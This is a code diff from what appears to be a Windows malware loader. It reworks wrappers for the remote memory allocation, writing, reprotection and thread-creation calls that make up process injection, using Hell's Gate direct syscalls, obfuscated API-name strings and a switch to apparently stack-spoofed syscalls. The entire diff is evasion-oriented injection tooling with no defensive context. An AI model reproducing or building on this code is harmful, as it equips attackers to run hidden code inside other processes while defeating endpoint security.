@@ -14,7 +14,7 @@
 NTSTATUS NtAlloc(HANDLE hProc, PVOID *base, SIZE_T size, ULONG protect) {
     SIZE_T sz = size;
     if (!HellsGateSetSSN(OBFSTR("NtAllocateVirtualMemory"))) return (NTSTATUS)0xC0000001;
-    return HellsGateCall(
+    return SpoofedSyscall8(
         (PVOID)hProc,
         (PVOID)base,
         (PVOID)0,
@@ -41,7 +41,7 @@ NTSTATUS NtFree(HANDLE hProc, PVOID base) {
 NTSTATUS NtWrite(HANDLE hProc, PVOID addr, PVOID data, SIZE_T size) {
     SIZE_T written = 0;
     if (!HellsGateSetSSN(OBFSTR("NtWriteVirtualMemory"))) return (NTSTATUS)0xC0000001;
-    return HellsGateCall(
+    return SpoofedSyscall8(
         (PVOID)hProc,
         addr,
         data,
@@ -56,7 +56,7 @@ NTSTATUS NtProtect(HANDLE hProc, PVOID addr, SIZE_T size, ULONG newProt, ULONG *
     SIZE_T sz = size;
     ULONG  old = 0;
     if (!HellsGateSetSSN(OBFSTR("NtProtectVirtualMemory"))) return (NTSTATUS)0xC0000001;
-    NTSTATUS st = HellsGateCall(
+    NTSTATUS st = SpoofedSyscall8(
         (PVOID)hProc,
         (PVOID)&addr,
         (PVOID)&sz,
@@ -76,7 +76,7 @@ NTSTATUS NtCreateThread(HANDLE hProc, PVOID startAddr, PVOID param, HANDLE *hThr
          StartRoutine, Argument, CreateFlags, ZeroBits,
          StackSize, MaximumStackSize, AttributeList) */
     if (!HellsGateSetSSN(OBFSTR("NtCreateThreadEx"))) return (NTSTATUS)0xC0000001;
-    NTSTATUS st = HellsGateCall(
+    NTSTATUS st = SpoofedSyscall8(
         (PVOID)&hThr,
         (PVOID)(ULONG_PTR)0x1FFFFF,  /* THREAD_ALL_ACCESS */
         NULL,
@@ -85,8 +85,7 @@ NTSTATUS NtCreateThread(HANDLE hProc, PVOID startAddr, PVOID param, HANDLE *hThr
         param,
         (PVOID)(ULONG_PTR)0,   /* CreateFlags: run immediately */
         (PVOID)0
-        /* remaining args (ZeroBits, StackSize, MaxStack, AttrList) default 0;
-           set via shadow space; compiler places them correctly for 8-arg call */
+        /* remaining args (ZeroBits, StackSize, MaxStack, AttrList) default 0 */
     );
     if (hThread) *hThread = (HANDLE)hThr;
     return st;
